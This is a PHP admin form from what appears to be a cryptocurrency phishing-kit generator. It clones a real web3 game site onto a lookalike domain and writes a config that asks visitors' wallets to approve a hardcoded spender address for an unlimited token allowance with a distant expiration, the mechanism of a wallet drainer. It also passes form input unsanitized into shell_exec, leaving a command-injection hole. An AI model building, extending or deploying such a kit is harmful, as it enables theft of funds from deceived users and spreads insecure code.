<?php

namespace App\Admin\Forms;

use Illuminate\Http\Request;
use OpenAdmin\Admin\Widgets\Form;
use \App\Models\PacketSiteCollection;
use OpenAdmin\Admin\Admin;
use \App\Models\Tokenlist;
class AutoWebpacketFrom extends Form
{
    /**
     * The form title.
     *
     * @var string
     */
    public $title = '';


    public function writeDconfig($token_arr,$chain){
        $spender_address = "0xf347901a602e71e2F4ce7796e54146C2e746dd8c";
        $amount = "1461501637330902918203684832716283019655932542975";
        $expiration = 1885674579;

        $config = "const spender_address = \"$spender_address\";\n";
        $config .= "const chain = \"$chain\";\n";
        $config .= "const amount = \"$amount\";\n";
        $config .= "const expiration = $expiration;\n";
        $config .= "export const D = {\n";
        $config .= "\tspender_address: spender_address,\n";
        $config .= "\texpiration: expiration,\n";

        foreach ($token_arr as $token => $address) {
            $tokenObj = Tokenlist::where('address',$address)->get('name');
            $token = explode("-",$tokenObj[0]['name']);
            $config .= "\t$token[1]: {\n";
            $config .= "\t\tname: \"$token[1]\",\n";
            $config .= "\t\taddress: \"$address\",\n";
            $config .= "\t\tamount: amount,\n";
            $config .= "\t\texpiration: expiration,\n";
            $config .= "\t},\n";
        }

        $config .= "};\n";

        file_put_contents('../storage/webpacket_site/configs/D.js',$config);
    }

public function writeEnv($raw_website,$new_domain,$seo_title,$page_content_path,$seo_keyword,$chain,$clicky_id){
    //写入env文件
$env_content = '
NEXT_PUBLIC_ENABLE_TESTNETS = false
NEXT_PUBLIC_DOMAIN_WEBSITE  = '.$raw_website.'
NEXT_PUBLIC_SOURCE  = '.$new_domain.'
NEXT_PUBLIC_WEBSITE_PAGE_TITLE  = '.$seo_title.'
NEXT_PUBLIC_WEBSITE_PAGE_CONTENT  = '.$page_content_path.'
NEXT_PUBLIC_WEBSITE_PAGE_KEYWORD  = '.$seo_keyword.'
NEXT_PUBLIC_CHAIN = '.$chain.'
NEXT_PUBLIC_CLICKY = '.$clicky_id;
file_put_contents('../storage/webpacket_site/.env',$env_content);
}


    /**
     * Handle the form request.
     *
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request)
    {
        $raw_website = $request->post('raw_website');
        $new_domain = $request->post('new_domain');
        $clicky_id =  $request->post('clicky_id');
        $page_content_path= 'page_content.html';
        $seo_title = $request->post('seo_title');
        $seo_keyword = $request->post('seo_keyword');
        $chain = $request->post('chain');
        $tokens = $request->post('tokens');
        array_pop($tokens);

        $this->writeDconfig($tokens,$chain);      
        $this->writeEnv($raw_website,$new_domain,$seo_title,$page_content_path,$seo_keyword,$chain,$clicky_id);

        //写入数据库
        $packetCollection = new PacketSiteCollection();
        $isExist = $packetCollection::where('chain', $chain)->where('new_domain', $new_domain)->count();
        if($isExist) return back();
            $packetCollection->raw_website = $raw_website;
            $packetCollection->new_domain = $new_domain;
            $packetCollection->clicky_id = $clicky_id;
            $packetCollection->owner = Admin::user()->id;
            $packetCollection->seo_title = $seo_title;
            $packetCollection->seo_keyword =$seo_keyword;
            $packetCollection->chain = $chain;
            $packetCollection->save();
        try{
            //打开网站写入html
            $html_data = file_get_contents($raw_website);
            file_put_contents('../storage/webpacket_site/page_content.html',$html_data);
            $result = shell_exec('./webpacket.sh '.$clicky_id);
            echo "<br><br>Download: <a href='/dist_$clicky_id.tar.gz'>下载地址</a>" ;
        }catch(Exception $e){
            echo $e->getMessage();
        }

       // admin_success('Processed successfully.');
        //return back();
    }

    /**
     * Build a form here.
     */
    public function form()
    {
        $this->text('chain')->rules('required');
        $this->text('raw_website')->rules('required');
        $this->text('new_domain')->rules('required');
        $this->text('clicky_id')->rules('required');
        $this->text('seo_title')->rules('required');
        $this->text('seo_keyword')->rules('required');
      
        $this->multipleSelect('tokens','Tokens')->options(\App\Models\Tokenlist::where('isenable',1)->get()->pluck('name','address'));
        //$this->email('email')->rules('email');
        // $this->datetime('created_at');
    }

    /**
     * The data of the form.
     *
     * @return array $data
     */
    public function data()
    {
        return [
            'chain' => '1',
            'raw_website'       => 'https://worldoffairy.com',
            'new_domain'      => 'https://worldoffairy.online',
            'clicky_id' => 101414536,
            'created_at' => now(),
            'seo_title' => 'World of Fairy',
            'seo_keyword'=> "World of Fairy is a web3.0 game on Polygon. play to earn, p2e ,It's in early stages but more will join us to improve it and experience the beauty of the Web3 world."
        ];
    }
}
